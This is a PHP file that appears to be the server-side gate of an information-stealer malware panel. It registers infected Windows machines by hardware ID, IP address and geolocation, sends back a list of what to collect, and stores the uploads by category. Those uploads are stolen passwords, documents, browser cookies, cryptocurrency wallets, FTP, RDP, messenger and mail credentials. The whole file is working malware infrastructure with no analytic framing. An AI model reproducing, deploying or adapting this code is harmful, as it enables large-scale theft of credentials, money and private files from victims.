<?php
	require_once('../includes/data.php');
	define('SEPERATOR', '<!s@az$>');
	$config = parse_ini_file('../includes/config.ini');
	$userAgent = $_SERVER['HTTP_USER_AGENT'];
	$decUserAgent = Data::decrypt($userAgent);
	if(!isset($_POST['q'])) exit;
	$postData = Data::decrypt($_POST['q'], $decUserAgent);
	$params = explode(SEPERATOR, $postData);
	if(strcmp($params[0], $decUserAgent) !== 0) exit;
	$pCount = count($params);
	if($pCount < 1) exit;
	$keyLength = strlen($decUserAgent);
	if($keyLength <= 0) exit;
	session_start();
	$regEx = '/[\d\w]{4}-[\d\w]{4}-[\d\w]{4}-[\d\w]{4}-[\d\w]{4}-[\d\w]{4}-[\d\w]{4}-[\d\w]{4}/';
	if($pCount >= 2 && $pCount <= 4 && $keyLength >= 4 && $keyLength <= 9)
	{
		if(isset($_SESSION['hwid']) || isset($_SESSION['time']) || !preg_match($regEx, $params[1])) exit;
		$fileName = 'other/requests.log';
		$cont = '';
		if(!file_exists($fileName))
			file_put_contents($fileName, '');
		else $cont = file_get_contents($fileName);
		if($config['al_duplicate'] != 1 && mb_strpos($cont, $params[1])!==false) exit;
		$_SESSION['hwid'] = $params[1];
		$time = time();
		$_SESSION['time'] = array(date('d.m.y', $time), $time);
		require_once('../includes/geoloc.php');
		$db = new Database('../includes/geobase.bin', Database::FILE_IO);
		$ipAddr = isset($_POST['i']) ? $_POST['i'] : $_SERVER['REMOTE_ADDR'];
		$geoloc = $db->lookup($ipAddr, Database::ALL);
		$username = isset($params[3]) ? $params[3] : '-';
		$os = isset($params[2]) ? $params[2] : '-';
		$isrv = '';
		$bit = isset($params[2]) ? ' '.mb_substr($params[2], -3) : '';
		if(mb_strpos($os,'Server')!==false) $isrv = 'Server';
		if(mb_strpos($os,'XP ')!==false || mb_strpos($os,'Windows Embedded XP ')!==false) $os = 'Windows XP';
		else if(mb_strpos($os,'7 ')!==false || mb_strpos($os,'Windows Embedded 7 ')!==false) $os = 'Windows 7';
		else if(mb_strpos($os,'Windows 8 ')!==false || mb_strpos($os,'Windows Embedded 8 ')!==false) $os = 'Windows 8';
		else if(mb_strpos($os,'Windows 8.1 ')!==false || mb_strpos($os,'Windows Embedded 8.1 ')!==false) $os = 'Windows 8.1';
		else if(mb_strpos($os,'Windows 10 ')!==false || mb_strpos($os,'Windows Embedded 10 ')!==false) $os = 'Windows 10';
		else $os = 'Windows X';
		$milliseconds = round(microtime(true) * 1000);
		echo Data::encrypt(implode(SEPERATOR, array($config['ac_passwords'], $config['ac_cookies'], $config['ac_docs'], $config['ac_docs_ft'], $config['ac_docs_sz'], $config['ac_docs_st'], $config['ac_wallets'], $config['ac_messengers'], $config['ac_ftp_cl'], $config['ac_rdp'], $config['ac_docs_dr'], $config['ac_mail'])), $decUserAgent);
		$fcont = "$milliseconds<;>$ipAddr<;>".$geoloc['countryName'].'<;>'.$params[1]."<;>$username<;>$os$isrv$bit<;>$time<:>".PHP_EOL;
		$fcont .= file_get_contents($fileName);
		file_put_contents($fileName, $fcont);
	}
	if($pCount == 2 && $keyLength >= 10 && $keyLength <= 14)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || $config['ac_passwords'] != 1) exit;
		$dirName = 'storage/passwords/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		file_put_contents($dirName.$_SESSION['time'][1].'.pwd', $params[1]);
	}
	if($pCount == 3 && $keyLength >= 15 && $keyLength <= 19)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || empty($params[2]) || $config['ac_docs'] != 1) exit;
		$dirName = 'storage/docs/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/'.$_SESSION['time'][1].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		$fileName = $dirName.$params[1];
		$constName = $fileName;
		for($i=0;file_exists($fileName);$i++)
		{
			$woex = explode('.', $constName);
			$fileName = $woex[0]." ($i)".(isset($woex[1]) ? '.'.$woex[1] : '');
		}
		file_put_contents($fileName, pack('H*', $params[2]));
	}
	if($pCount == 2 && $keyLength >= 25 && $keyLength <= 30)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || $config['ac_cookies'] != 1) exit;
		$dirName = 'storage/cookies/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/'.$_SESSION['time'][1].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		$fileName = $dirName.'Cookies.txt';
		$constName = $fileName;
		for($i=0;file_exists($fileName);$i++)
		{
			$woex = pathinfo($constName);
			$fileName = $woex['dirname'].'/'.$woex['filename']." ($i)".(isset($woex['extension']) ? '.'.$woex['extension'] : '');
		}
		file_put_contents($fileName, $params[1]);
	}
	if($pCount == 4 && $keyLength >= 40 && $keyLength <= 45)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || empty($params[2]) || empty($params[3]) || $config['ac_wallets'] != 1) exit;
		$wtype = 'other';
		if($params[3] == 2) $wtype = 'bitcoin';
		else if($params[3] == 3) $wtype = 'dogecoin';
		if($params[3] == 4) $wtype = 'litecoin';
		$dirName = "storage/wallets/$wtype/".$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/'.$_SESSION['time'][1].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		$fileName = $dirName.$params[1];
		$constName = $fileName;
		for($i=0;file_exists($fileName);$i++)
		{
			$woex = pathinfo($constName);
			$fileName = $woex['dirname'].'/'.$woex['filename']." ($i)".(isset($woex['extension']) ? '.'.$woex['extension'] : '');
		}
		file_put_contents($fileName, pack('H*', $params[2]));
	}
	if($pCount == 3 && $keyLength >= 81 && $keyLength <= 86)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || empty($params[2]) || $config['ac_ftp_cl'] != 1) exit;
		$dirName = "storage/cuteftp/".$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/'.$_SESSION['time'][1].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		$fileName = $dirName.$params[1];
		$constName = $fileName;
		for($i=0;file_exists($fileName);$i++)
		{
			$woex = pathinfo($constName);
			$fileName = $woex['dirname'].'/'.$woex['filename']." ($i)".(isset($woex['extension']) ? '.'.$woex['extension'] : '');
		}
		file_put_contents($fileName, pack('H*', $params[2]));
	}
	if($pCount == 2 && $keyLength >= 46 && $keyLength <= 55)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || $config['ac_ftp_cl'] != 1) exit;
		$dirName = 'storage/ftp/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		file_put_contents($dirName.$_SESSION['time'][1].'.pwd', $params[1]);
	}
	if($pCount == 2 && $keyLength >= 56 && $keyLength <= 60)
	{	
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || $config['ac_messengers'] != 1) exit;
		$dirName = 'storage/imcl/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		file_put_contents($dirName.$_SESSION['time'][1].'.pwd', $params[1]);
	}
	if($pCount == 3 && $keyLength >= 61 && $keyLength <= 70)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || empty($params[2]) || $config['ac_rdp'] != 1) exit;
		$dirName = 'storage/rdp/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/'.$_SESSION['time'][1].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		$fileName = $dirName.$params[1];
		$constName = $fileName;
		for($i=0;file_exists($fileName);$i++)
		{
			$woex = pathinfo($constName);
			$fileName = $woex['dirname'].'/'.$woex['filename']." ($i)".(isset($woex['extension']) ? '.'.$woex['extension'] : '');
		}
		file_put_contents($fileName, pack('H*', $params[2]));
	}
	if($pCount == 2 && $keyLength >= 71 && $keyLength <= 80)
	{
		if(!isset($_SESSION['hwid']) || !isset($_SESSION['time']) || !preg_match($regEx, $_SESSION['hwid']) || empty($params[1]) || $config['ac_mail'] != 1) exit;
		$dirName = 'storage/mail/'.$_SESSION['hwid'].'/'.$_SESSION['time'][0].'/';
		if(!file_exists($dirName)) mkdir($dirName, 0755, true);
		file_put_contents($dirName.$_SESSION['time'][1].'.pwd', $params[1]);
	}
?>